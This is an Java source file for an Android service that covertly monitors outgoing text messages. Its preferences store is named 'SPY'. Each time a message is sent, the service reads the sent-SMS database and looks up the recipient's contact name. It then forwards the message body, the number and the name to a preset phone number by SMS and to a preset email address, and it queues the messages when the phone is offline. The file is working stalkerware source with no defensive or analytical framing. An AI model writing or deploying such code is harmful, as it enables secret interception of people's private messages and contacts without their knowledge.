package com.example.remote;


import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.StrictMode;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.SmsManager;
import android.util.Log;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.logging.Logger;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;

public class OutgoingSMSReceiver extends Service
{
	Context cx;
	SharedPreferences values;
	static String contactName = "";
	final SmsManager sms = SmsManager.getDefault();
	
	  private final ContentObserver sentObserver = new ContentObserver(null)
	  {
	    public void onChange(boolean paramAnonymousBoolean)
	    {
	      super.onChange(paramAnonymousBoolean);
	      OutgoingSMSReceiver.this.onChangeDetected();
	    }
	  };
	
	
	
	  private void onChangeDetected()
	  {
		  if(values.getBoolean("divert_num_ch", false) || values.getBoolean("mail_mess_ch", false)) 
	      {
			 Log.e("((((((((((", ")))))))))");
	     	 sent_mess();
	      }
	    
	  }
	
	  public IBinder onBind(Intent paramIntent)
	  {
	    return null;
	  }
	
	  public void onCreate()
	  {
	    super.onCreate();
	    getBaseContext().getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, this.sentObserver);
	    StrictMode.enableDefaults();
		 cx = this;
		 values = this.getSharedPreferences("SPY", 0);
	  }
	
	  public void onDestroy()
	  {
	    super.onDestroy();
	    if (this.sentObserver != null)
	      getBaseContext().getContentResolver().unregisterContentObserver(this.sentObserver);
	  }
	
	  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
	  {
	    return 1;
	  }
	  
	  String last_mess;
	  
	  	public void sent_mess()
		 {
			 Uri mSmsinboxQueryUri = Uri.parse("content://sms/sent");
		     Cursor cursor1 = cx.getContentResolver().query(mSmsinboxQueryUri,
		                 new String[] { "_id", "thread_id", "address", "person", "date",
		                                 "body", "type" }, null, null, null);
		     //((Object) cx).startManagingCursor(cursor1);
		     String[] columns = new String[] { "address", "person", "date", "body","type" };
		     if (cursor1.getCount() > 0) 
		     {
		    	 last_mess = values.getString("last_mess", "");
		    	 boolean send = false;
		    	 boolean first = true;
		         String count = Integer.toString(cursor1.getCount());
		         Log.e("Count",count);
		         cursor1.moveToLast();
		         while (cursor1.moveToPrevious())
		         {
		        	if(first == true)
		        	{
		        		cursor1.moveToNext();
		        		first = false;
		        	}
		            String type = cursor1.getString(cursor1.getColumnIndex(columns[4]));
		            if(type.equals("2")) // 2 for Sent Sms
		             {
		                String address = cursor1.getString(cursor1.getColumnIndex(columns[0]));
		                //String name = cursor1.getString(cursor1.getColumnIndex(columns[1]));
		                String date = cursor1.getString(cursor1.getColumnIndex(columns[2]));
		                String msg = cursor1.getString(cursor1.getColumnIndex(columns[3]));
		                if(address.charAt(0) == '+' )
		                {
		                	address = "0" + address.substring(3);
		                }
		                if(send == true && !address.equals("09" + values.getString("divert_num_ed", "")))
		                {
		                	//Log.e("%%%%%%%%", address);
			                //Log.e("#######", "09" + values.getString("divert_num_ed", ""));
		                	send_sent_mess(msg, address);
		                	values.edit().putString("last_mess", date).commit();
		                	Log.e("00000000000000", msg);
		                }
		                else if(date.compareTo(last_mess)>=0)
		                {
		                	Log.e("1111111111", msg);
		                	send = true;
		                }
		                
		             }
		         }
		     }
		 }
		 
		//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
		public void send_sent_mess(String msg,String address)
		{
			getContactName(cx, address);
			if(values.getBoolean("divert_num_ch", false) && !values.getString("divert_num_ed", "").equals("") )
	     	sms.sendTextMessage("09" + values.getString("divert_num_ed", ""), 
	     			null, msg + "SendTo: " + address + contactName, null, null);
	     	ConnectivityManager manager = (ConnectivityManager) cx.getSystemService(Context.CONNECTIVITY_SERVICE);
		        NetworkInfo networkInfo = manager.getActiveNetworkInfo();
		        if(!(networkInfo == null || !networkInfo.isConnected() || !networkInfo.isAvailable())
		        		&& values.getBoolean("mail_mess_ch", false) 
		        		&& !values.getString("mail_mess_ed", "").equals(""))
	 		{
		        	Log.e("^^^^^^", "8888888");
		        	sendMail s = new sendMail();
		        	s.sendAccelerationData(msg + "SendTo: " + address + contactName, values.getString("mail_mess_ed", ""));
	 		}
		        else if(values.getBoolean("mail_mess_ch", false))
		        {
		        	String a = values.getString("sent_mess_not", "");
		        	a +=  msg + "SendTo: " + address + contactName + "\n" ;
		        	values.edit().putString("sent_mess_not", a).commit();
		        }
		}
	//*****************************************************************************
		public static void getContactName(Context context, String phoneNumber)
		{
			    
			 ContentResolver cr = context.getContentResolver();
			 Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
		  	 Cursor cursor = cr.query(uri, new String[]{PhoneLookup.DISPLAY_NAME}, null, null, null);
		  	 if (cursor == null) {
		  	 }
		    
		  	 else if(cursor.moveToFirst()) 
		  	 {
		  		 contactName = "(" + cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME)) + ")";
		  	 }
		
		  	 else if(cursor != null && !cursor.isClosed()) {
		  		 cursor.close();
		  	 }
		
		}
	
}